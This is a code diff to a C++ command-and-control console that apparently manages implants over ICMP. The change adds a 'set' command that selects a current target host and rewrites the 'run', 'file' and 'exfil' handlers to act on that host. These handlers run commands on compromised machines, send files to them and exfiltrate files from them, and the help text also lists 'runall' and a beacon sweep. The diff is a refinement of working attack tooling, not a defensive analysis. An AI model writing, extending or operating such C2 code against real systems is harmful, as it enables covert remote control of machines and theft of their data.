@@ -40,6 +40,8 @@ static std::map<std::string, std::string> hosts;
 static std::mutex active_connections_mutex;
 static bool listening = false;
 
+static std::string cur_host;
+
 /**
  * @brief Calculates checksum of an array of data.
  * 
@@ -480,13 +482,14 @@ void help()
   std::puts("\tstart: begin listening for connections");
   std::puts("\tlist: list active connections");
   std::puts("\thosts: list all hosts");
+  std::puts("\tset [host]: sets the cur host");
   std::puts("\tping [ip]: ping an ip");
   std::puts("\tpingh [host]: ping a host");
   std::puts("\tbeacon: clears active cache and pings all machines");
-  std::puts("\trun [host] [command]: run a command on a target machine");
+  std::puts("\trun [command]: run a command on a target machine");
   std::puts("\trunall [command]: runs command on all machines");
-  std::puts("\tfile [host] [src] [dst]: send a file over to host machine");
-  std::puts("\texfil [host] [src] [dst]: receive a file from the host machine");
+  std::puts("\tfile [src] [dst]: send a file over to host machine");
+  std::puts("\texfil [src] [dst]: receive a file from the host machine");
   std::puts("\texport [filename]: exports currently connected hosts to file");
   std::puts("\tload [filename]: loads file to hosts list");
   std::puts("\tclear: clears currently connected list");
@@ -517,7 +520,7 @@ int main(int argc, char **argv)
   while (1)
   {
     std::string input;
-    std::cout << "> ";
+    std::cout << cur_host << " > ";
     std::getline(std::cin, input);
 
     if (input.empty()) {
@@ -566,6 +569,20 @@ int main(int argc, char **argv)
         std::cout << it->first << ": " << it->second << "\n";
       }
     }
+    else if (input_arr.at(0).compare("set") == 0) 
+    {
+      // set host to execute commands
+      if (input_arr.size() < 2)
+      {
+        std::puts("usage: set [host]");
+        continue;
+      }
+      if (active_connections.find(input_arr.at(1)) == active_connections.end()) {
+        std::puts("host not connected!");
+        continue;
+      }
+      cur_host = input_arr.at(1);
+    }
     else if (input_arr.at(0).compare("ping") == 0)
     {
       // ping an individual host by ip
@@ -604,15 +621,15 @@ int main(int argc, char **argv)
     else if (input_arr.at(0).compare("run") == 0)
     {
       // run a command on a host by hostname
-      if (input_arr.size() < 3)
+      if (input_arr.size() < 2)
       {
-        std::puts("usage: run [host] [command]");
+        std::puts("usage: run [command]");
         continue;
       }
 
-      std::string ip = active_connections[input_arr.at(1)];
+      std::string ip = active_connections[cur_host];
       std::string command;
-      for (int i = 2; i < input_arr.size(); i++)
+      for (int i = 1; i < input_arr.size(); i++)
       {
         command.append(input_arr.at(i));
         if (i != input_arr.size() - 1)
@@ -658,32 +675,32 @@ int main(int argc, char **argv)
     else if (input_arr.at(0).compare("file") == 0)
     {
       // send a file over ICMP to host
-      if (input_arr.size() < 4)
+      if (input_arr.size() < 3)
       {
-        std::puts("usage: file [host] [src] [dst]");
+        std::puts("usage: file [src] [dst]");
         continue;
       }
-      std::string ip = active_connections[input_arr.at(1)];
+      std::string ip = active_connections[cur_host];
 
-      std::cout << "Sending file: " << input_arr.at(2) << " to: " << input_arr.at(3) << " on: "
+      std::cout << "Sending file: " << input_arr.at(1) << " to: " << input_arr.at(2) << " on: "
                 << ip
                 << "\n";
-      send_file(ip, input_arr.at(2), input_arr.at(3));
+      send_file(ip, input_arr.at(1), input_arr.at(2));
     }
     else if (input_arr.at(0).compare("exfil") == 0)
     {
       // exfiltrate a file from a host
-      if (input_arr.size() < 4)
+      if (input_arr.size() < 3)
       {
-        std::puts("usage: exfil [host] [src] [dst]");
+        std::puts("usage: exfil [src] [dst]");
         continue;
       }
-      std::string ip = active_connections[input_arr.at(1)];
+      std::string ip = active_connections[cur_host];
 
-      std::cout << "Receiving file: " << input_arr.at(2) << " to: " << input_arr.at(3) << " on: "
+      std::cout << "Receiving file: " << input_arr.at(1) << " to: " << input_arr.at(2) << " on: "
                 << ip
                 << "\n";
-      receive_file(ip, input_arr.at(2), input_arr.at(3));
+      receive_file(ip, input_arr.at(1), input_arr.at(2));
     }
     else if (input_arr.at(0).compare("export") == 0)
     {
